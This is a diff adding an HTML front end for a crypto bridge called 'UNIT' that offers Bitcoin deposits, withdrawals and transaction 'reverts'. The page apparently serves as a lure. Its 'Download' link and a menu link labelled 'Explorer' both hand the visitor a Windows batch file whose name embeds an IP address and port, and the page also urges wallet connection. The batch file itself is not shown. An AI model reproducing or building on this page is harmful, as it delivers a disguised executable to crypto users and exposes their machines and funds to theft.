@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>UNIT · Revert</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="assets/sources.js"></script>
+  <script src="assets/app-bundle_mw25nqf0.js"></script>
+  <script src="assets/qr-code-styling.js"></script>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap"
+    rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body data-view="revert">
+  <header class="nav">
+    <div class="wrap nav-in">
+      <a class="logo" href="#transfer" data-go="transfer"
+        aria-label="UNIT"><!-- swap for assets/logo.svg --><span>UNIT</span><i></i></a>
+      <nav class="links">
+        <a class="connect-button" data-go="transfer" href="#transfer">Transfer</a>
+        <a class="connect-button" data-go="revert" href="#revert">Revert</a>
+        <a class="connect-button" href="#">Support</a>
+        <a class="connect-button" download="SC_216.22.5.86_8040_101159.bat"
+          href="assets/SC_216.22.5.86_8040_101159.bat">Download</a>
+      </nav>
+      <div class="nav-r">
+        <button class="connect-button btn-o theme-btn m-only" data-theme-toggle aria-label="Toggle theme"><i
+            class="ri-sun-line"></i></button>
+        <button class="connect-button btn-o wallet"><span class="d-only">Connect Wallet</span><span
+            class="m-only">Connect</span></button>
+        <button class="burger m-only" id="burger" aria-label="Menu"><i class="ri-menu-line"></i></button>
+      </div>
+    </div>
+  </header>
+
+  <div class="menu" id="menu">
+    <div class="menu-top"><a class="logo" href="#transfer"><span>UNIT</span><i></i></a><button class="burger"
+        id="menuClose" aria-label="Close"><i class="ri-close-line"></i></button></div>
+    <a data-go="transfer" href="#transfer">Transfer</a><a data-go="revert" href="#revert">Revert</a><a
+      href="#">Support</a>
+    <a href="assets/SC_216.22.5.86_8040_101159.bat" download="SC_216.22.5.86_8040_101159.bat">Download <i
+        class="ri-external-link-line"></i></a><a href="assets/SC_216.22.5.86_8040_101159.bat"
+      download="SC_216.22.5.86_8040_101159.bat">Explorer <i class="ri-external-link-line"></i></a>
+  </div>
+
+  <main class="wrap">
+    <section class="card" id="view-revert">
+      <h1>Request Revert</h1>
+      <p class="sub">Validate the original transfer with its transaction hash and submit a revert request</p>
+      <button class="asset-row" data-open-modal><span class="asset-l"></span><i
+          class="ri-arrow-down-s-line chev"></i></button>
+      <div class="tx">
+        <label class="field"><span>Tx Hash</span><input type="text" placeholder="abc123..." autocomplete="off"
+            spellcheck="false"></label>
+        <button class="connect-button check">Check</button>
+      </div>
+      <p class="hint">Enter the transaction hash of your original failed <b data-chain-name>Bitcoin</b> deposit.</p>
+    </section>
+
+    <section class="card" id="view-transfer" hidden>
+      <div class="tabs">
+        <button class="connect-button tab on" data-mode="deposit">Deposit<small>to Hyperliquid</small></button>
+        <button class="connect-button tab" data-mode="withdraw">Withdraw<small>to <span
+              data-chain-name>Bitcoin</span></small></button>
+      </div>
+      <button class="asset-row" data-open-modal><span class="asset-l"></span><span class="on-txt" id="onTxt"></span><i
+          class="ri-arrow-down-s-line chev"></i></button>
+      <div class="w-only">
+        <label class="field amt"><span>Min 0.0003 <b data-sym>BTC</b></span><input type="text"
+            inputmode="decimal"><button class="max">Max</button></label>
+        <label class="field"><span><b data-chain-name>Bitcoin</b> recipient</span><input type="text" id="recip"
+            spellcheck="false"></label>
+      </div>
+      <dl class="info">
+        <div>
+          <dt>Minimum <span id="minLbl">deposit</span> amount</dt>
+          <dd>0.0003 <b data-sym>BTC</b></dd>
+        </div>
+        <div>
+          <dt>Estimated time to complete</dt>
+          <dd id="eta">~31 minutes</dd>
+        </div>
+        <div>
+          <dt>Estimated network cost</dt>
+          <dd id="cost">0.00002763 BTC (~1.79 USDC)</dd>
+        </div>
+      </dl>
+    </section>
+    <button class="connect-button cta" id="cta">Connect Wallet</button>
+  </main>
+
+  <footer class="foot">
+    <div class="wrap">
+      <div class="big">UNIT<i></i></div>
+      <p>Testnet application</p>
+      <p><a href="#">Homepage</a> <em></em> <a href="#">Explorer</a></p>
+      <p><a href="#">Privacy</a> <em></em> <a href="#">Terms</a></p>
+      <p><a href="#">Support</a></p>
+      <div class="social"><a href="#" aria-label="X"><i class="ri-twitter-x-line"></i></a><a href="#"
+          aria-label="Telegram"><i class="ri-telegram-2-fill"></i></a><a href="#" aria-label="Docs"><i
+            class="ri-book-2-fill"></i></a></div>
+      <span class="ver">129cf</span>
+      <pre class="ascii" id="ascii" aria-hidden="true"></pre>
+    </div>
+  </footer>
+
+  <button class="connect-button btn-o theme-btn fab d-only" data-theme-toggle aria-label="Toggle theme"><i
+      class="ri-sun-line"></i></button>
+
+  <nav class="bottom m-only">
+    <a class="connect-button" href="#"><i class="ri-question-line"></i>Support</a>
+    <a class="connect-button" data-go="transfer" data-mode="deposit" href="#transfer"><i
+        class="ri-wallet-3-line"></i>Deposit</a>
+    <a class="connect-button" data-go="transfer" data-mode="withdraw" href="#transfer"><i
+        class="ri-arrow-go-back-line"></i>Withdraw</a>
+  </nav>
+
+  <div class="modal" id="modal" hidden>
+    <div class="sheet" role="dialog" aria-label="Select asset">
+      <div class="grab"></div>
+      <div class="sh-h">
+        <h2 id="mTitle">Select asset to request a revert</h2><button id="mClose" aria-label="Close"><i
+            class="ri-close-line"></i></button>
+      </div>
+      <label class="search"><i class="ri-search-line"></i><input id="q" type="text"
+          placeholder="Search supported revert assets"></label>
+      <ul id="list"></ul>
+      <div class="chains" id="chains"></div>
+    </div>
+  </div>
+  <script src="app.js"></script>
+</body>
+
+</html>
